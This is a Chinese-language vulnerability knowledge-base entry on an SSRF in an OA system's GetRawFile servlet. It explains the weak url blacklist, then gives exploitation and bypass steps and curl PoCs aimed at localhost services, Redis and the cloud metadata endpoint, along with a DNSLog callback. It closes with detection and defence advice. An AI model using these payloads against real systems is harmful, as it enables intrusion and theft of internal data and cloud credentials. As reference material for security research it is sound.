---
id: web-generic-ssrf-oa-getrawfile-weak-blacklist
title: OA GetRawFile 接口仅黑名单过滤 url 参数，导致 SSRF 读取内网 HTTP 响应
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-weak-url-blacklist
tags:
- web
- ssrf
- oa
- java
- blacklist-bypass
- internal-network
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V6
  verified_at: '2026-11-05T00:41:16+08:00'
  notes: 已对照原文与24张内嵌截图核对：GetRawFile servlet 映射、url 参数仅做 startsWith(http|/jsoa) 与 WEB-INF/./.\ 黑名单、new URL(urlPath).openStream() 逐行 println 回显，均与截图一致；/jsoa/rss/show 与 /jsoa/portal3/messageServices.jsp 拼接 userId 也一致。未验证点：原文仅用 DNSLog 验证出站，未展示读取具体内网敏感数据；未实际复现。组件名/版本原文未给出，未设versions。
url: /docs/web/generic/ssrf/web-generic-ssrf-oa-getrawfile-weak-blacklist/
draft: false
kb_aliases:
- GetRawFile SSRF
- OA SSRF
- url 参数 SSRF
- 黑名单 SSRF 绕过
- printFile SSRF
---

## 一句话结论

OA 的 `/GetRawFile` servlet 把可控 `url` 参数只做“以 http 开头 + 不含 WEB-INF/./.\”的黑名单检查，随后 `url.openStream()` 读取内容并原样打印，攻击者可让服务器请求任意内网 HTTP 服务并拿到响应。

## 原理

- `GetRawFile` 从 `req.getParameter("url")` 取值，检查 `urlPath.startsWith("http") || urlPath.startsWith("/jsoa")`，再拒绝包含 `WEB-INF`、`./`、`.\` 的字符串。
- 检查通过后直接 `new URL(urlPath)` 并 `url.openStream()`，逐行读入 `PrintWriter` 返回给客户端。服务端没有对目标 IP/域名做白名单，也没有禁止内网地址。
- 黑名单只覆盖极少数关键字：`http://127.0.0.1:8080/actuator`、`http://169.254.169.254/...`、内网业务系统等都不含被禁字符串，可直接访问。
- 对 `/jsoa/rss/show/`、`/jsoa/portal3/messageServices.jsp` 等特定路径，代码还会自动拼接当前 `userId`，但这只是附加参数，不构成访问控制。
- 该 SSRF 是“完整可用的读原语”：响应体会被完整回显，可用于探测内网服务、读取未授权接口/云元数据、配合 CRLF 或重定向扩大影响。

## 触发条件

- 目标暴露 `GetRawFile` servlet（或同类 `printFile`/代理接口）。
- `url` 参数可控，且服务端可出网/可访问内网。
- 黑名单未覆盖目标地址与编码变形。

## 利用步骤

1. 访问 `/GetRawFile?url=http://127.0.0.1:8080/`，确认返回内网响应而非错误。
2. 用 DNSLog/HTTPLog 验证出站：`url=http://<id>.dnslog.cn/`，观察解析记录。
3. 枚举内网常见端口与服务（Tomcat、Redis HTTP 接口、Actuator、云元数据 169.254.169.254）。
4. 对返回内容中的接口继续请求，读取敏感数据。
5. 若目标过滤 `./`，用 URL 编码、大小写、`%2e%2e%2f` 等变形测试（过滤器只看原始参数，`new URL` 会按自身规则解析）。

## PoC

```http
GET /GetRawFile?url=http://127.0.0.1:8080/manager/html HTTP/1.1
Host: target
```

```bash
curl -s 'http://target/GetRawFile?url=http://169.254.169.254/latest/meta-data/'
curl -s 'http://target/GetRawFile?url=http://127.0.0.1:6379/'
```

DNS 出站验证：

```bash
curl -s 'http://target/GetRawFile?url=http://<random>.dnslog.cn/'
```

响应体即目标 URL 的内容（代码逐行读取并打印）。

## 变体与关联

- 变体：`/jsoa` 前缀分支会拼接 `userId`，可观察参数注入；若过滤器拒绝 `./`，用编码/重定向/短链接绕过；支持 302 时可用攻击者服务器跳转到内网地址。
- 关联：[[web-generic-ssrf-ip-notation-blacklist-bypass]]（IP 表示变形绕过黑名单）；[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（解析器差异）；[[cloud/metadata]]（云元数据读取）。
- 边界：原文只验证了出站 DNS 与代码回显逻辑，未给出读取具体内网敏感数据的截图；但代码路径完整，置信度 high。

## 检测与防御

- 检测：`GetRawFile`/`printFile` 等接口的 `url` 参数出现内网地址、元数据地址、DNSLog 域名；服务器对非业务域名的出站 HTTP 请求；响应体异常包含内网页面/元数据。
- 防御：对目标 URL 做协议+域名/IP 白名单，解析后校验 IP 不属于内网/回环/链路本地；禁止跟随重定向或逐跳校验；关闭不必要的代理/文件读取接口；出站流量做网络层限制。
